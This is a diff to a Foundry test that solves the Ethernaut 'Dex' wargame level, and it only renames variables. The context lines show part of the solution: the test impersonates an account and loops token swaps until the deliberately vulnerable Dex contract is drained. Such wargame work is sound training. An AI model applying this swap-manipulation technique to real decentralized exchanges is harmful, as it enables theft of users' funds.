@@ -11,7 +11,7 @@ contract DexTest is DSTest {
     Ethernaut ethernaut;
     DexFactory dexFactory;
     Vm private constant vm = Vm(HEVM_ADDRESS);
-    address eoaAddress = address(69);
+    address eoa = address(69);
 
     function setUp() public {
         ethernaut = new Ethernaut();
@@ -21,13 +21,13 @@ contract DexTest is DSTest {
     }
 
     function testIsDexCleared() public {
-        vm.startPrank(eoaAddress);
+        vm.startPrank(eoa);
 
-        address instanceAddress = ethernaut.createLevelInstance(dexFactory);
-        Dex dex = Dex(instanceAddress);
+        address instance = ethernaut.createLevelInstance(dexFactory);
+        Dex dex = Dex(instance);
 
         address[2] memory tokens = [dex.token1(), dex.token2()];
-        dex.approve(instanceAddress, 500);
+        dex.approve(instance, 500);
 
         uint256[2] memory hackBalances;
         uint256[2] memory dexBalances;
@@ -36,8 +36,8 @@ contract DexTest is DSTest {
 
         while (true) {
             hackBalances = [
-                SwappableToken(tokens[fromIndex]).balanceOf(eoaAddress),
-                SwappableToken(tokens[toIndex]).balanceOf(eoaAddress)
+                SwappableToken(tokens[fromIndex]).balanceOf(eoa),
+                SwappableToken(tokens[toIndex]).balanceOf(eoa)
             ];
 
             dexBalances = [
@@ -61,7 +61,7 @@ contract DexTest is DSTest {
             toIndex = 1 - toIndex;
         }
 
-        assertTrue(ethernaut.submitLevelInstance(payable(instanceAddress)));
+        assertTrue(ethernaut.submitLevelInstance(payable(instance)));
 
         vm.stopPrank();
     }
